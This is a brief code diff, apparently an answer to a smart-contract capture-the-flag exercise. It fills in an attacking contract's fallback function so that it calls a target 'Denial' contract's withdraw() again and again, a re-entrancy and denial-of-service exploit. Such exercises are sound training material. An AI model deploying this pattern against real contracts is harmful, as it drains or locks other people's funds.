@@ -9,5 +9,10 @@ contract AttackingDenial {
         contractAddress = _contractAddress;
     }
 
-    //Code me!
+    fallback() external payable {
+        Denial target = Denial(contractAddress);
+        if (payable(contractAddress).balance > 0) {
+            target.withdraw();
+        }
+    }
 }
